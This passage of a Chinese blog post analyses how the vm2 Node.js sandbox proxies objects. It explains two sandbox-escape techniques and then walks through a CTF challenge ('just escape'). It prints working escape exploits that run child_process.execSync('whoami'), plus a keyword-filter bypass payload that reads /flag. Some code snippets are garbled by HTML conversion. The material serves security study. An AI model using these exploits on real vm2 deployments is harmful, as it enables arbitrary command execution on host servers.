-<p>console.log(vm.run(script));  //2</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">运行代码的实现</span><br></pre></td></tr></table></figure>
-<p>首先，new VMScript(“let a=2;a”)会调用vm.Script编译代码为script</p>
-<p>然后，let vm=new VM()会调用vm,createContext创建一个上下文context，然后引入sandbox.js将其封装为一个匿名函数anonymous，之后调用封装的匿名函数anonymous，绑定其中的this为context</p>
-<p>最后vm.run(script)会调用vm.runInContext在上下文的context中运行script</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">而且当我们创建VM的对象时，vm2内部会引入contextify.js，针对vm.createContext创建的上下文作为参数传入，并且vm的api会将contextify.js封装为一个匿名函数</span><br></pre></td></tr></table></figure>
-<pre><code>    Reflect.defineProperty(this, &#39;_internal&#39;, &#123;
-        value: vm.runInContext(`(function(require, host) &#123; $&#123;cf&#125; n&#125;)`, this._context, &#123;
-            filename: `$&#123;__dirname&#125;/contextify.js`,
-            displayErrors: false
-        &#125;).call(this._context, require, host)
-    &#125;);
-</code></pre>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">其中对于封装为匿名函数的contextify.js会先定义vm2的一些常量，并且会在global和this上添加了相应的属性</span><br></pre></td></tr></table></figure>
-<p>// eslint-disable-next-line no-invalid-this, no-shadow<br>const global = this;</p>
-<p>// global is originally prototype of host.Object so it can be used to climb up from the sandbox.<br>Object.setPrototypeOf(global, Object.prototype);</p>
-<p>Object.defineProperties(global, {<br>    global: {value: global},<br>    GLOBAL: {value: global},<br>    root: {value: global},<br>    isVM: {value: true}<br>});</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">虽然是在函数体外部写了return语句，所以webstrom报错，但是实际上这串代码还是会封装在函数中的</span><br></pre></td></tr></table></figure>
-<p>return{<br>    Contextify,<br>    Decontextify,<br>    Buffer:LocalBuffer<br>};</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">其中的Contextify和Decontextify都是两个weakmap，而weakmap是es6新增的语法，只接受对象作为键名，并且这些对象是不会被计入垃圾回收机制的，这是防止内存泄露，而这是用来存储已经被代理过的对象的</span><br><span class="line"></span><br><span class="line">而Contextify.readonly 做了些什么</span><br></pre></td></tr></table></figure>
-<p>const LocalBuffer = global.Buffer = Contextify.readonly(host.Buffer, {<br>    allocUnsafe: function allocUnsafe(size) {<br>        return this.alloc(size);<br>    },<br>    allocUnsafeSlow: function allocUnsafeSlow(size) {<br>        return this.alloc(size);<br>    }<br>});</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">而对于整个匿名函数调用的顺序是</span><br></pre></td></tr></table></figure>
-<p>”global.Buffer=“—-&gt;“cobtextify.readonly”—-&gt;“contextify.value”—-&gt;contextify.value“—-&gt;”contextify.function“—-&gt;”contextify.object“</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">从匿名函数的调用过程，我们可以看见最后它返回的是代理对象，而且还会做一个object.assign的操作，即将所有可枚举属性的值从一个或多个源对象复制到目标对象，然后返回目标对象，如</span><br></pre></td></tr></table></figure>
-<p>const target = { a: 1, b: 2 };<br>const source = { b: 4, c: 5 };</p>
-<p>const returnedTarget = Object.assign(target, source); // Object { a: 1, b: 4, c: 5 }</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可见source的b会覆盖target的b，而覆盖的1优先级是</span><br></pre></td></tr></table></figure>
-<p> deepTraps &gt; traps &gt; {get:…, set: …}</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">最终会得到Buffer代理对象，而它本身仍然是nodejs提供的，只是vm2加了一层代理，所以在vm2的沙箱中访问它的属性时会被设定的方法拦截，而且Contextify.object 内部还使用了 WeakMap 来存储已经代理过的对象和对象的代理，所以在vm2沙箱环境中，如果是内部的对象，由于vm的实现机制保证了内部定义的对象无法逃逸，而对于外部引入的对象，由于vm2提供的代理机制会拦截constructor等属性的访问，从而保证这个沙箱的安全</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">实例</span><br><span class="line"></span><br><span class="line">在main.js编写如下代码</span><br></pre></td></tr></table></figure>
-<p>const {VM, VMScript} = require(‘vm2’);<br>const fs = require(‘fs’);<br>const file = <code>$&#123;__dirname&#125;/sandbox.js</code>;</p>
-<p>// By providing a file name as second argument you enable breakpoints<br>const script = new VMScript(fs.readFileSync(file), file);</p>
-<p>console.log(new VM().run(script));</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">在sandbox.js中编写</span><br></pre></td></tr></table></figure>
-<p>let a = Buffer.from(“”); //访问Buffer的from属性并调用<br>a.i = () =&gt; {}; //给对象添加属性<br>console.log(a.i); //访问对象的属性</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">上面已经写了Buffer是一个代理的对象，访问其所有的属性都会被拦截，而let a=Buffer.from(&quot;&quot;);代码的调用过程</span><br></pre></td></tr></table></figure>
-<p>Buffer.from—-&gt;代理的get拦截—-&gt;contextify.value—-&gt;contextify.function—-&gt;contextify.object</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我们从调用过程中可以看见Buffer代理对象访问其from属性，然后被代理的get方法拦截，经过层层调用后，会返回一个函数的代理对象，而这个代理对象会被当作函数调用，会被apply捕获，apply拦截方法</span><br></pre></td></tr></table></figure>
-<p>apply: (target, context, args) =&gt; {<br>    try {<br>        context = Decontextify.value(context);</p>
-<pre><code>    // Set context of all arguments to host&#39;s context.
-    return Contextify.value(fnc.apply(context, Decontextify.arguments(args)));
-&#125; catch (e) &#123;
-    throw Contextify.value(e);
-&#125;
-</code></pre>
-<p>}</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">然后apply拦截方法的调用过程</span><br></pre></td></tr></table></figure>
-<p>Buffer.from(“”)—&gt;代理apply拦截—&gt;Decontextify.value(context)对上下文解封装—&gt;Decontextify.arguments(args)对参数解封装—&gt;apply函数调用—&gt;contextify.value对得到的结果封装</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">这里调用了Decontextify.value，实际上Decontextify的实现和contextify是对称的，只是有点略微的不同，而Decontextify.value首先会检查contextified中是否有这个对象，如果有则直接返回，没有则加一层代理</span><br><span class="line"></span><br><span class="line">从这个函数的调用，我们知道vm2针对很多对象做了代理，但是实际调用一次函数时，会将代理的&quot;外壳&quot;给剥除掉，并且必须依靠nodejs提供的api来完成，如果我们可以捕获这个对象，我们就完成vm2的逃逸</span><br><span class="line"></span><br><span class="line">之后还会执行</span><br></pre></td></tr></table></figure>
-<p>a.i=()=&gt;{};</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">此时会被代理的se方法拦截</span><br><span class="line"></span><br><span class="line">此时的value是一个函数，Decontextify.value 针对其进行了封装，返回一个函数的代理对象，就是说a.i为一个函数的代理对象，而且这个函数的代理对象中</span><br></pre></td></tr></table></figure>
-<p>constructor属性返回的会是host.function</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">所以当我们执行最后一行代码时</span><br></pre></td></tr></table></figure>
-<p>console.log(a.i);</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">会被代理的get方法拦截，但是vm2的作者通过contextify.value取出被代理之前的对象，最终还是得到原来的函数，所以无法获得被代理的函数对象</span><br><span class="line"></span><br><span class="line">## vm2沙箱逃逸的原理</span><br><span class="line"></span><br><span class="line">有两种逃逸方法</span><br><span class="line"></span><br><span class="line">### 第一种vm2逃逸方法</span><br><span class="line"></span><br><span class="line">它在proxy机制中没有定义has方法，所以我们可以在外部定义has方法，从而让它在触发has方法时调用外部的has方法，而在外部的has方法中可以通过</span><br></pre></td></tr></table></figure>
-<p>process = t.constructor(“return process”)();</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">来访问原型链中的construct属性，从而获得function，使用内置函数执行恶意代码</span><br><span class="line"></span><br><span class="line">我们可以通过这个例子来理解一下has方法的触发</span><br></pre></td></tr></table></figure>
-<p>var handler = {<br>    get () {<br>     console.log(“get”);<br>    }<br>  };</p>
-<p>  var target = {};</p>
-<p>  var proxy = new Proxy(target, handler);</p>
-<p>  Object.prototype.has = function(){<br>    console.log(“has”);<br>  }</p>
-<p>  proxy.a; //触发get<br>  “” in proxy; //触发has，这个has是在原型链上定义的</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">可见在对象target定义了get操作，所以当时使用proxy.a时会打印出get，而当&quot;&quot; in proxy时，由于target对象中没有直接定义has进行拦截，所以会调用外部的has拦截，从而输出has</span><br><span class="line"></span><br><span class="line">案例1</span><br></pre></td></tr></table></figure>
-<p>var handler = {<br>    get () {<br>     console.log(“get”);<br>    }<br>  };</p>
-<p>  var target = {};</p>
-<p>  var proxy = new Proxy(target, handler);</p>
-<p>  Object.prototype.has = function(){<br>    console.log(“has”);<br>  }</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">由于Buffer.from是一个代理对象，但是在vm2内部的Object中没有has方法，所以我们可以自己给Object对象的原型中添加has方法，这时候运行</span><br></pre></td></tr></table></figure>
-<p>“” in Buffer.from</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">就会执行我们自定义的has方法，由于proxy机制，参数t为function Buffer.from，而这个function时在外部，其上下文是 nodejs 的global下，所以访问其 constructor 属性就获取到了外部的 Function，从而拿到外部的 process</span><br><span class="line"></span><br><span class="line">修补方法是在Buffer.from中加入has方法，就不会在原型链中查找constructor 属性</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 第二种vm2逃逸方法</span><br><span class="line"></span><br><span class="line">我们可以利用Object.defineProperty来设置对象的访问器属性</span><br><span class="line"></span><br><span class="line">就是本来代码</span><br></pre></td></tr></table></figure>
-<p>var obj = {<br>    prop: let obj = {<br>    prop:123,<br>    Writable: true<br>}</p>
-<p>let jbo = {<br>    get prop(){<br>        return “get”;<br>    },<br>    set prop(val){<br>        console.log(“set”+val);<br>    }<br>}</p>
-<p>console.log(obj.prop); //123<br>console.log(jbo.prop); //get</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">但是我们可以利用Object.defineProperty</span><br></pre></td></tr></table></figure>
-<p>let obj = {};<br>Object.defineProperty(obj, “prop”, {<br>    get get(){<br>        console.log(“get1”); //get1<br>        return ()=&gt;{return “get2”};<br>    }<br>})<br>console.log(obj.prop); //get2</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">此时会先执行get()函数，打印出get1，返回一个函数，作为prop属性的getter，之后访问obj.prop会打印出get2，然后我们再看vm2逃逸的代码</span><br></pre></td></tr></table></figure>
-<p>var process;<br>try {<br>    let a = Buffer.from(“”)<br>    Object.defineProperty(a, “”, {<br>        get set() {<br>            Object.defineProperty(Object.prototype, “get”, {<br>                get: function get() {<br>                    throw function (x) {<br>                        return x.constructor(“return process”)();<br>                    };<br>                }<br>            });<br>            return ()=&gt;{};<br>        }</p>
-<pre><code>&#125;);
-</code></pre>
-<p>} catch (e) {<br>    process = e(() =&gt; {});<br>}</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">执行的过程</span><br></pre></td></tr></table></figure>
-<pre><code>                  同时”异步执行在Object.prototype上添加get属性“
-                                                                   /
-</code></pre>
-<p>“Buffer.from(“”)返回一个代理对象a”—&gt;”Object.defineProperty在a上添加属性，被代理的defineProerty拦截“–&gt;vm2内部访问到Object.prototype.get时”—&gt;”vm2内部抛出异常并被捕获“–&gt;“vm2再次抛出异常e”—&gt;”捕获vm2内部的异常“–&gt;执行e(()=&gt;{})逃逸</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">此时a是一个代理对象，当我们在a上定义新属性时会被defineProperty拦截，而在defineProperty中有一串代码会检测descriptor上是否设置了get和set，如果是，则会调用外部的host.Object.defineProperty 去实现设置对象属性</span><br><span class="line"></span><br><span class="line">但是在执行decriptor.get时，由于nodejs是异步的，所以会触发</span><br></pre></td></tr></table></figure>
-<p>Object.defineProperty(Object.prototype, “get”, {<br>                get: function get() {<br>                    throw function (x) {<br>                        return x.constructor(“return process”)();<br>                    };<br>                }<br>            });</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">抛出异常</span><br></pre></td></tr></table></figure>
-<p>throw x=&gt;x.constructor(“return process”)();</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">而这个异常会被vm2内部捕获，就是这里的e</span><br></pre></td></tr></table></figure>
-<p>}catch(e){<br>    throw Contextify.value(e);<br>}</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">然后vm2会将这个抛出的异常包装成一个代理对象之后，继续抛出，最后被我们的代码捕获</span><br></pre></td></tr></table></figure>
-<p>}catch(e){<br>    let k=()=&gt;{};<br>    process=e(k);<br>}<br>然后会将其作为函数来调用，就会触发这个函数代理对象的apply方法，此时apply方法中的target为x=&gt;x.constructor(‘return process’)()，context是函数的上下文代理，通过Decontextify.value 之后是 underfined，然后args是函数的参数代理，其值为()=&gt;{}，然后会先将函数的参数进行一次处理，然后反射调用函数，并将得到结果包装成代理对象，即函数的参数()=&gt;{}是一个函数，不是代理对象，所以decontextify将其做了一次包装后，成为一个代理对象，然后这个代理对象触发get方法后的constructor属性返回host.function，所以导致了沙箱逃逸</p>
-<h2 id="实例just-escape"><a href="#实例just-escape" class="headerlink" title="实例just escape"></a>实例just escape</h2><p>打开页面，发现有提示</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/run.php?code=(2%2b6-7)/3</span><br><span class="line"></span><br><span class="line">/run.php?code=new%20Date()</span><br></pre></td></tr></table></figure>
-<p>然后构造</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/run.php</span><br></pre></td></tr></table></figure>
-<p>发现有源码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( array_key_exists( &quot;code&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;code&#x27; ] != NULL ) &#123;</span><br><span class="line">    $code = $_GET[&#x27;code&#x27;];</span><br><span class="line">    echo eval(code);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>此时，我们直接构造</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=system(&quot;ls&quot;);</span><br></pre></td></tr></table></figure>
-<p>发现有过滤，然后再仔细查看</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">真的是php嘛</span><br></pre></td></tr></table></figure>
-<p>这句话，我们可以推测可能是其它，而nodejs也有eval()函数，所以使用Error().stack测试，发现报错</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error at vm.js:1:1 at Script.runInContext (vm.js:131:20) at VM.run (/app/node_modules/vm2/lib/main.js:219:62) at /app/server.js:51:33 at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5) at next (/app/node_modules/express/lib/router/route.js:137:13) at Route.dispatch (/app/node_modules/express/lib/router/route.js:112:3) at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5) at /app/node_modules/express/lib/router/index.js:281:22 at Function.process_params (/app/node_modules/express/lib/router/index.js:335:12)</span><br></pre></td></tr></table></figure>
-<p>从报错中的</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error at vm.js:1:1</span><br></pre></td></tr></table></figure>
-<p>我们可以猜测可能是vm2沙箱逃逸，所以我们可以利用vm2沙箱逃逸来执行恶意代码，所以我们可以使用以下exp</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&quot;use strict&quot;;</span><br><span class="line">const &#123;VM&#125; = require(&#x27;vm2&#x27;);</span><br><span class="line">const untrusted = &#x27;(&#x27; + function()&#123;</span><br><span class="line">	TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)();</span><br><span class="line">	try&#123;</span><br><span class="line">		Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1;</span><br><span class="line">	&#125;catch(e)&#123;</span><br><span class="line">		return e.get_process(()=&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;+&#x27;)()&#x27;;</span><br><span class="line">try&#123;</span><br><span class="line">	console.log(new VM().run(untrusted));</span><br><span class="line">&#125;catch(x)&#123;</span><br><span class="line">	console.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>或者使用以下exp</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&quot;use strict&quot;;</span><br><span class="line">const &#123;VM&#125; = require(&#x27;vm2&#x27;);</span><br><span class="line">const untrusted = &#x27;(&#x27; + function()&#123;</span><br><span class="line">	try&#123;</span><br><span class="line">		Buffer.from(new Proxy(&#123;&#125;, &#123;</span><br><span class="line">			getOwnPropertyDescriptor()&#123;</span><br><span class="line">				throw f=&gt;f.constructor(&quot;return process&quot;)();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;));</span><br><span class="line">	&#125;catch(e)&#123;</span><br><span class="line">		return e(()=&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;+&#x27;)()&#x27;;</span><br><span class="line">try&#123;</span><br><span class="line">	console.log(new VM().run(untrusted));</span><br><span class="line">&#125;catch(x)&#123;</span><br><span class="line">	console.log(x);</span><br><span class="line">&#125;</span><br><span class="line">```           </span><br><span class="line"></span><br><span class="line">其实简单的说就是利用()=&gt;&#123;&#125;这个函数被包装成代理对像，而这个代理对象中的get方法的constructor属性的返回值为host.function，所以利用其来使用内置类来执行恶意代码</span><br><span class="line"></span><br><span class="line">但是这里有对特殊字母有过滤</span><br></pre></td></tr></table></figure>
-<p>for, while, process, exec, eval, constructor, prototype, Function</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">所以我们可以利用在关键字母上加反引号`来绕过</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">或者使用$&#123;$&#123;prototyp&#125;e&#125;来绕过，即</span><br></pre></td></tr></table></figure>
-<p>/run.php?code=(function (){<br>    TypeError[<code>$&#123;</code>${<code>prototyp</code>}e<code>&#125;</code>][<code>$&#123;</code>${<code>get_proces</code>}s<code>&#125;</code>] = f=&gt;f[<code>$&#123;</code>${<code>constructo</code>}r<code>&#125;</code>](<code>$&#123;</code>${<code>return this.proces</code>}s<code>&#125;</code>)();<br>    try{<br>        Object.preventExtensions(Buffer.from(``)).a = 1;<br>    }catch(e){<br>        return e<a href="()=%3E%7B%7D"><code>$&#123;</code>${<code>get_proces</code>}s<code>&#125;</code></a>.mainModule<a href="%60$%7B%60$%7B%60child_proces%60%7Ds%60%7D%60"><code>$&#123;</code>${<code>requir</code>}e<code>&#125;</code></a>[<code>$&#123;</code>${<code>exe</code>}cSync<code>&#125;</code>](<code>cat /flag</code>).toString();<br>    }<br>})()</p>
-<p>```<br>即可得到flag</p>
-<p>参考文章：[<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/207291]">https://www.anquanke.com/post/id/207291]</a></p>
-<pre><code>[https://www.anquanke.com/post/id/207283]
-
-[https://es6.ruanyifeng.com/?search=weakmap&amp;x=0&amp;y=0#docs/proxy]
-
-[https://github.com/patriksimek/vm2/issues/225]    
-
-[https://www.freesion.com/article/92951402280/]                                            
-</code></pre>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/nodejs/" rel="tag">nodejs</a></li></ul>
 	</div>
 
       
